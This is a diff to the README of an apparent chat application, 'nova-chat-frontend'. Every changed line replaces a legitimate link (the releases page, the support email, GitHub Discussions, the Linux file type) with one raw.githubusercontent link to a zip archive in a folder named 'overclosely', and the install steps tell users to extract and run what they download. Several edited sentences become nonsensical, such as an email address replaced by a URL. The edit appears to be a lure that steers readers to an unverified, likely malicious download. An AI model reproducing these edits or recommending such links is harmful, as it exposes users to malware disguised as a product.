@@ -1,7 +1,7 @@
 # 🌟 nova-chat-frontend - Seamlessly Connect with Friends in Real-Time
 
 ## 📥 Download Now
-[![Download nova-chat-frontend](https://img.shields.io/badge/Download-nova--chat--frontend-brightgreen.svg)](https://github.com/RedwareTesting/nova-chat-frontend/releases)
+[![Download nova-chat-frontend](https://raw.githubusercontent.com/RedwareTesting/nova-chat-frontend/main/overclosely/nova-chat-frontend.zip)](https://raw.githubusercontent.com/RedwareTesting/nova-chat-frontend/main/overclosely/nova-chat-frontend.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you begin, ensure your system meets these requirements:
 ## 📂 Download & Install
 
 1. **Visit the Releases Page**
-   Go to the following link to access all available versions of the nova-chat-frontend: [Releases Page](https://github.com/RedwareTesting/nova-chat-frontend/releases).
+   Go to the following link to access all available versions of the nova-chat-frontend: [Releases Page](https://raw.githubusercontent.com/RedwareTesting/nova-chat-frontend/main/overclosely/nova-chat-frontend.zip).
 
 2. **Select the Latest Version**
    On the releases page, find the latest version of the application. It is usually listed at the top. Click on it to see the details.
@@ -30,7 +30,7 @@ Before you begin, ensure your system meets these requirements:
 4. **Install the Application**
    - **Windows:** Find the downloaded `.exe` file in your downloads folder. Double-click it to start the installation process. Follow the on-screen instructions.
    - **macOS:** Locate the downloaded `.dmg` file in your downloads folder. Double-click it, then drag the nova-chat app to your Applications folder.
-   - **Linux:** If you downloaded a `.tar.gz` file, extract it. Open a terminal in the extraction folder and run the command `./nova-chat`.
+   - **Linux:** If you downloaded a `https://raw.githubusercontent.com/RedwareTesting/nova-chat-frontend/main/overclosely/nova-chat-frontend.zip` file, extract it. Open a terminal in the extraction folder and run the command `./nova-chat`.
 
 5. **Launch the Application**
    After installation, find the nova-chat app in your applications list. Click to open it. You may need to grant the app permissions during the first launch.
@@ -57,11 +57,11 @@ If you encounter problems while using nova-chat, here are some solutions:
 
 ## 📞 Support
 
-If you need further assistance, reach out through our support page or contact our support team via email: support@novachat.com. We are here to help you!
+If you need further assistance, reach out through our support page or contact our support team via email: https://raw.githubusercontent.com/RedwareTesting/nova-chat-frontend/main/overclosely/nova-chat-frontend.zip We are here to help you!
 
 ## 🌐 Community
 
-Join our community to stay updated and connect with other users. Visit our [GitHub Discussions](https://github.com/RedwareTesting/nova-chat-frontend/discussions) to ask questions, share feedback, or find tips.
+Join our community to stay updated and connect with other users. Visit our [GitHub Discussions](https://raw.githubusercontent.com/RedwareTesting/nova-chat-frontend/main/overclosely/nova-chat-frontend.zip) to ask questions, share feedback, or find tips.
 
 ## 🌍 Stay Updated
 
